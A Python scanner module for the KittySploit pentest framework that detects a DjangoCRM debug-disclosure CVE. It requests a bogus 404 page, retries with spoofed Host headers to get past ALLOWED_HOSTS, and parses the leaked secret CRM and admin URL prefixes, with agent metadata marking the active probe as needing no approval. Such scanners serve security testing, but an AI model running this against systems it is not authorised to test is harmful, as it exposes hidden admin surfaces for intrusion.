#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Detect DjangoCRM (django-crm) CVE-2026-71238 unauthenticated debug disclosure."""

import re
from html import unescape

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        "name": "DjangoCRM CVE-2026-71238 Debug Disclosure Detect",
        "description": (
            "Detects CVE-2026-71238 in DjangoCRM 0.91 through 2.4.0: shipped webcrm/settings.py "
            "keeps DEBUG=True and relies on secret URL prefixes for admin/CRM access. A bogus i18n "
            "404 triggers Django's technical_404_response and leaks those prefixes to any anonymous "
            "requester, defeating access-by-obscurity."
        ),
        "author": ["KittySploit Team"],
        "severity": "high",
        "cve": ["CVE-2026-71238"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-71238",
            "https://www.cve.org/CVERecord?id=CVE-2026-71238",
        ],
        "modules": ["auxiliary/admin/http/django_crm_cve_2026_71238_info_disclosure"],
        "tags": [
            "web",
            "scanner",
            "django",
            "django-crm",
            "debug",
            "info-disclosure",
            "crm",
            "cve-2026-71238",
            "vuln",
        ],
        "agent": {
            "risk": "active",
            "effects": ["network_probe"],
            "expected_requests": 2,
            "reversible": True,
            "approval_required": False,
            "produces": ["tech_hints", "risk_signals", "endpoints", "exploit_paths"],
            "cost": 1.0,
            "noise": 0.4,
            "value": 1.0,
            "requires": {
                "tech_hints_any": ["django", "python"],
                "confidence_min_any": {"django": 0.2},
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "info_disclosure", "from_detail": "URLconf prefix leak"},
                    {"capability": "admin_surface", "from_detail": "recovered CRM prefix"},
                ],
                "suggested_followups": [
                    "auxiliary/admin/http/django_crm_cve_2026_71238_info_disclosure",
                ],
            },
        },
    }

    port = OptPort(8000, "DjangoCRM HTTP port", True)
    ssl = OptBool(False, "Use HTTPS", True, advanced=True)
    lang_prefix = OptString("en", "i18n language prefix for the bogus 404 probe", False, advanced=True)
    probe_suffix = OptString(
        "alim-nonexistent-zzz",
        "Final path segment for the bogus 404 probe",
        False,
        advanced=True,
    )

    def _parse_prefixes(self, body: str):
        if "Django tried these URL patterns" not in (body or ""):
            return None, None, []
        text = unescape(body or "")
        pairs = re.findall(
            r"<code>\s*([A-Za-z]{2}(?:-[A-Za-z]{2})?/)\s*</code>\s*"
            r"<code>\s*([^<\s][^<]*?)\s*</code>",
            text,
        )
        counts = {}
        order = []
        for _lang, nested in pairs:
            nested = nested.strip()
            if not nested:
                continue
            if nested not in counts:
                counts[nested] = 0
                order.append(nested)
            counts[nested] += 1
        if not order:
            return None, None, []
        ranked = sorted(order, key=lambda p: (-counts[p], order.index(p)))
        return ranked[0], ranked[1] if len(ranked) > 1 else None, order

    def run(self):
        base = (self.path or "/").rstrip("/")
        path = f"{base}/{self.lang_prefix}/{self.probe_suffix.lstrip('/')}"
        try:
            response = self.http_request(method="GET", path=path, allow_redirects=False, timeout=int(self.timeout or 15))
            if response and response.status_code == 400:
                for host in ("localhost", "127.0.0.1"):
                    response = self.http_request(
                        method="GET",
                        path=path,
                        allow_redirects=False,
                        timeout=int(self.timeout or 15),
                        headers={"Host": host},
                    )
                    if response and response.status_code != 400:
                        break
        except Exception as exc:
            print_status(f"CVE-2026-71238 probe failed: {exc.__class__.__name__}")
            return False

        if not response or response.status_code == 400:
            if response and response.status_code == 400:
                print_status("CVE-2026-71238 probe blocked by ALLOWED_HOSTS (HTTP 400)")
            return False

        body = response.text or ""
        if "Django tried these URL patterns" not in body:
            return False

        crm, admin, all_prefixes = self._parse_prefixes(body)
        if not all_prefixes:
            self.set_info(
                severity="medium",
                reason="CVE-2026-71238: Django debug 404 present but no nested prefixes parsed",
                cve="CVE-2026-71238",
                path=path,
            )
            return True

        reason = f"CVE-2026-71238: URLconf leaked CRM prefix '{crm}'"
        if admin:
            reason += f", admin prefix '{admin}'"

        print_status(f"CVE-2026-71238 vuln=True prefixes={', '.join(all_prefixes)}")
        self.set_info(
            severity="high",
            reason=reason,
            vulnerable=True,
            cve="CVE-2026-71238",
            path=path,
            crm_prefix=crm,
            admin_prefix=admin,
            prefixes=all_prefixes,
            login_path=f"{base}/{self.lang_prefix}/{crm}" if crm else None,
        )
        return True
